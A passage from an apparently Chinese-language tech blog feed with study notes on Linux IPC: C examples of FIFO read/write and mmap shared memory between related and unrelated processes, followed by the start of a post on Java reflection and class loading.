class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd,i;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Enter like this: ./a.out fifoname\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">fd = open(argv[<span class="number">1</span>],O_WRONLY);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">sys_err(<span class="string">"open error"</span>);</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(buf,<span class="string">"hello elssm %d\n"</span>,i++);</span><br><span class="line">write(fd,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个文件是写入fifo文件的代码<code>fifo_r.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd,len;</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Enter like this: ./a.out fifoname\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">fd = open(argv[<span class="number">1</span>],O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">sys_err(<span class="string">"open error"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">len = read(fd,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">write(STDOUT_FILENO,buf,len);</span><br><span class="line">sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="存储映射"><a href="#存储映射" class="headerlink" title="存储映射"></a>存储映射</h4><h5 id="mmap函数"><a href="#mmap函数" class="headerlink" title="mmap函数"></a>mmap函数</h5><p>创建共享内存映射</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr,<span class="keyword">size_t</span> length,<span class="keyword">int</span> prot,<span class="keyword">int</span> flags,<span class="keyword">int</span> fd,<span class="keyword">off_t</span> offset)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">返回：成功 返回创建的映射区首地址</span><br><span class="line">失败：MAP_FAILED宏</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">  addr:建立映射区的首地址，由Linux内核指定，使用时，直接传递<span class="literal">NULL</span></span><br><span class="line">  length:欲创建映射区的大小</span><br><span class="line">  prot:映射区权限  PROT_READ,PROT_WRITE,PROT_READ|PROT_WRITE</span><br><span class="line">  flags:标志位参数(常用于设定更新物理区域，设置共享，创建匿名映射区)</span><br><span class="line">    MAP_SHARED：会将映射区所做的操作反映到物理设备(磁盘)上</span><br><span class="line">    MAP_PRIVATE：映射区所做的修改不会反映到物理设备</span><br><span class="line">  fd:用于创建共享内存映射区的那个文件的文件描述符</span><br><span class="line">  offset:偏移位置，需是<span class="number">4</span>k的整数倍</span><br></pre></td></tr></table></figure><h5 id="mmap函数建立文件映射区"><a href="#mmap函数建立文件映射区" class="headerlink" title="mmap函数建立文件映射区"></a>mmap函数建立文件映射区</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> *p = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line">fd = open(<span class="string">"testmap"</span>,O_RDWR|O_CREAT|O_TRUNC,<span class="number">0644</span>);</span><br><span class="line"><span class="keyword">if</span>(fd==<span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"open err"</span>);</span><br><span class="line">lseek(fd,<span class="number">20</span>,SEEK_END);</span><br><span class="line">write(fd,<span class="string">"\0"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> len = lseek(fd,<span class="number">0</span>,SEEK_END);</span><br><span class="line"></span><br><span class="line">p = mmap(<span class="literal">NULL</span>,len,PROT_READ|PROT_WRITE,MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(p == MAP_FAILED)&#123;</span><br><span class="line">sys_err(<span class="string">"mmap error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//使用p对文件进行读写操作</span></span><br><span class="line"><span class="built_in">strcpy</span>(p,<span class="string">"hello mmap"</span>); <span class="comment">//写操作</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"------%s\n"</span>,p); <span class="comment">//读操作</span></span><br><span class="line"><span class="keyword">int</span> ret = munmap(p,len);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"munmap error"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="mmap注意事项"><a href="#mmap注意事项" class="headerlink" title="mmap注意事项"></a>mmap注意事项</h5><ul><li>创建映射区的过程中，隐含着一次对映射文件的读操作</li><li>当<code>MAP_SHARED</code>时，要求：映射区的权限应&lt;=文件打开的权限(出于对映射区的保护)，而<code>MAP_PRIVATE</code>则无所谓，因为mmap中的权限是对内存的限制</li><li>映射区的释放与文件关闭无关，只要映射建立成功，文件可以立即关闭</li><li>特别注意，当映射文件大小为0时，不能创建映射区，所以，用于映射的文件必须要有实际大小</li><li>munmap传入的地址一定是mmap的返回地址，坚决杜绝指针++操作</li><li>文件偏移量必须为4K的整数倍</li><li>mmap创建映射区出错概率非常高，一定要检查返回值，确保映射区建立成功在进行后续操作</li></ul><h5 id="父子进程间mmap通信"><a href="#父子进程间mmap通信" class="headerlink" title="父子进程间mmap通信"></a>父子进程间mmap通信</h5><p>代码练习，父进程创建映射区，然后fork子进程，子进程修改映射区内容，之后父进程读区映射区内容，查看是否共享</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> var = <span class="number">100</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *p;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line">fd = open(<span class="string">"temp"</span>,O_RDWR|O_CREAT|O_TRUNC,<span class="number">0644</span>);</span><br><span class="line"><span class="keyword">if</span>(fd==<span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"open err"</span>);</span><br><span class="line"></span><br><span class="line">ftruncate(fd,<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">p = (<span class="keyword">int</span> *)mmap(<span class="literal">NULL</span>,<span class="number">4</span>,PROT_READ|PROT_WRITE,MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(p == MAP_FAILED)&#123;</span><br><span class="line">sys_err(<span class="string">"mmap error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">close(fd); <span class="comment">//映射区建立完毕，即可关闭文件</span></span><br><span class="line"></span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">*p = <span class="number">2000</span>; <span class="comment">//写共享内存</span></span><br><span class="line">var = <span class="number">1000</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"child,*p = %d,var = %d\n"</span>,*p,var); <span class="comment">//读共享内存</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"parent,*p = %d,var = %d\n"</span>,*p,var);</span><br><span class="line">wait(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ret = munmap(p,<span class="number">4</span>); <span class="comment">//释放映射区</span></span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"munmap error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="非血缘关系进程间通信"><a href="#非血缘关系进程间通信" class="headerlink" title="非血缘关系进程间通信"></a>非血缘关系进程间通信</h5><p>代码练习，两个进程，一个对结构体进行修改后写入，另一个进程对写入后的结构体进行读取</p><p>第一个文件是写入文件的代码<code>mmap_w.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span> = &#123;</span><span class="number">1</span>,<span class="string">"elssm"</span>,<span class="number">22</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">p</span>;</span></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line">fd = open(<span class="string">"test_map"</span>,O_RDWR|O_CREAT|O_TRUNC,<span class="number">0644</span>);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"open error"</span>);</span><br><span class="line"></span><br><span class="line">ftruncate(fd,<span class="keyword">sizeof</span>(stu));</span><br><span class="line">p = mmap(<span class="literal">NULL</span>,<span class="keyword">sizeof</span>(stu),PROT_READ|PROT_WRITE,MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(p == MAP_FAILED)</span><br><span class="line">sys_err(<span class="string">"mmap error"</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">memcpy</span>(p,&amp;stu,<span class="keyword">sizeof</span>(stu));</span><br><span class="line">stu.id++;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">munmap(p,<span class="keyword">sizeof</span>(stu));</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个文件是读取文件的代码<code>mmap_r.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">p</span>;</span></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line">fd = open(<span class="string">"test_map"</span>,O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"open error"</span>);</span><br><span class="line"></span><br><span class="line">p = mmap(<span class="literal">NULL</span>,<span class="keyword">sizeof</span>(stu),PROT_READ,MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(p == MAP_FAILED)</span><br><span class="line">sys_err(<span class="string">"mmap error"</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"id = %d,name = %s,age = %d\n"</span>,p-&gt;id,p-&gt;name,p-&gt;age);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">munmap(p,<span class="keyword">sizeof</span>(stu));</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;进程和程序&quot;&gt;&lt;a href=&quot;#进程和程序&quot; class=&quot;headerlink&quot; title=&quot;进程和程序&quot;&gt;&lt;/a&gt;进程和程序&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;程序：只占用磁盘空间&lt;/li&gt;
&lt;li&gt;进程：运行起来的程序，占用内存、CPU等系统资源&lt;/li&gt;
&lt;/
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Java反射学习</title>
    <link href="elssm.github.io/2021/09/30/Java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0/"/>
    <id>elssm.github.io/2021/09/30/Java反射学习/</id>
    <published>2021-09-30T12:41:53.000Z</published>
    <updated>2021-09-30T12:43:42.823Z</updated>
    
    <content type="html"><![CDATA[<h4 id="类的加载"><a href="#类的加载" class="headerlink" title="类的加载"></a>类的加载</h4><p>当程序要使用某个类时，如果该类还未被加载到内存中，则系统会通过加载，连接，初始化三步来实现对这个类进行初始化。</p><ul><li>加载：将class文件读入内存，并为之创建一个Class对象。任何类被使用时系统都会建立一个Class对象。</li><li>连接<ul><li>验证：是否有正确的内部结构，并和其他类协调一致</li><li>准备：负责为类的静态成员分配内存，并设置默认初始化值</li><li>解析：将类的二进制数据中的符号引用替换为直接引用</li></ul></li><li>初始化：执行类构造器<code>&lt;clinit&gt;()</code>方法的过程。</li></ul><h4 id="类初始化时机"><a href="#类初始化时机" class="headerlink" title="类初始化时机"></a>类初始化时机</h4><ul><li>创建类的实例</li><li>访问类的静态变量，或者为静态变量赋值</li><li>调用类的静态方法</li><li>使用反射方式来强制创建某个类或接口对应的<code>java.lang.Class</code>对象</li><li>初始化某个类的子类</li><li>直接使用<code>java.exe</code>命令来运行某个主类</li></ul><h4 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h4><p>负责将<code>.class</code>文件加载到内存中，并为之生成对应的Class对象</p><p>类加载器的组成</p><ul><li>Bootstrap ClassLoader 根类加载器<ul><li>也被称为引导类加载器，负责Java核心类的加载，例如<code>System.String</code>等</li></ul></li><li>Extension ClassLoader 扩展类加载器<ul><li>负责JRE的扩展目录中jar包的加载</li></ul></li><li>System ClassLoader 系统类加载器<ul><li>负责在JVM启动时加载来自java命令的class文件，以及classpath环境变量所指定的jar包和类路径</li></ul></li></ul><h4 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h4><p>Java反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性。</p><p>要想解剖一个类，必须先要获取到该类的字节码文件对象，而解剖使用的就是Class类中的方法，所有先要获取到每一个字节码文件对应的Class类型的对象。</p><h4 id="为什么需要反射？"><a href="#为什么需要反射？" 